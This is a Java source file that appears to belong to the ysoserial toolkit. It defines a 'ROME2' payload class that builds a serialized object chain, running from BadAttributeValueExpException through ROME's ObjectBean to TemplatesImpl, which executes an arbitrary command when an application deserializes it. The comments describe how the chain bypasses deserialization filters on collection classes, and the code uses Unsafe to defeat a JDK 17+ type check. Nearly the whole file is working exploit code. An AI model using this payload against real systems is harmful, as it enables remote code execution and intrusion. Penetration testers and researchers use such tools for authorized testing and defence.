package ysoserial.payloads;

import java.lang.reflect.Field;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;

import com.sun.syndication.feed.impl.ObjectBean;

import sun.misc.Unsafe;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.JavaVersion;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	ROME variant using BadAttributeValueExpException as entry point.
	Avoids HashMap/HashSet entirely — bypasses filters on collection classes.

	Gadget chain:
		ObjectInputStream.readObject()
			BadAttributeValueExpException.readObject()
				ObjectBean.toString()
					ToStringBean.toString()
						BeanIntrospector iterates getters
							TemplatesImpl.getOutputProperties()
								TemplatesImpl.newTransformer()
									defineTransletClasses() → RCE

	Differs from ROME:
		- Entry: BadAttributeValueExpException (not HashMap)
		- Trigger: toString() in readObject() (not hashCode() via hash collision)
		- Bypasses filters on HashMap, HashSet, PriorityQueue

	Requires:
		rome 1.0
		JDK >= 8u76 (BadAttributeValueExpException.readObject() calls toString())
		No SecurityManager
 */

@SuppressWarnings({ "rawtypes", "unchecked" })
@Dependencies("rome:rome:1.0")
@Authors({ Authors.MBECHLER })
@PayloadTest(precondition = "isApplicableJavaVersion")
public class ROME2 extends PayloadRunner implements ObjectPayload<BadAttributeValueExpException> {

	public BadAttributeValueExpException getObject(final String command) throws Exception {
		final Object tpl = Gadgets.createTemplatesImpl(command);
		// ObjectBean(Templates.class, tpl) → ToStringBean iterates Templates getters only
		// This minimizes side effects: only getOutputProperties() and newTransformer()
		final ObjectBean delegate = new ObjectBean(Templates.class, tpl);

		// BadAttributeValueExpException.readObject() calls val.toString() when:
		//   1. val is not null, not a String, not a primitive wrapper
		//   2. System.getSecurityManager() == null
		// JDK 17+ changed field type from Object to String — use Unsafe to bypass
		// type check. The serialized stream still stores the ObjectBean, and
		// readObject()'s gf.get("val") returns it as Object regardless.
		final BadAttributeValueExpException bave = new BadAttributeValueExpException(null);
		final Field unsafeField = Unsafe.class.getDeclaredField("theUnsafe");
		unsafeField.setAccessible(true);
		final Unsafe unsafe = (Unsafe) unsafeField.get(null);
		final Field valField = BadAttributeValueExpException.class.getDeclaredField("val");
		unsafe.putObject(bave, unsafe.objectFieldOffset(valField), delegate);

		return bave;
	}

	public static boolean isApplicableJavaVersion() {
		return JavaVersion.isBadAttrValExcReadObj();
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(ROME2.class, args);
	}
}
